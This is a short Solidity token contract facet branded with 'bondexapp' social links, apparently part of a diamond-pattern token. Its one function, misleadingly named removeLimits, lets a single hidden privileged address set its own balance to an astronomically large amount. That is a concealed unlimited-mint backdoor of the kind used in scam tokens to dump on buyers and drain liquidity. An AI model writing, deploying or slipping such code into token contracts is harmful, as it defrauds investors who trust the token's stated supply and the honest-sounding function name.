/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/bondexapp
    // Twitter: https://twitter.com/bondexapp
    // Website: https://bondex.app/
    // Github: https://github.com/bondexapp
    // Discord: https://discord.com/invite/drPUc34J2r
    // Medium: https://medium.com/@bondexapp

*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
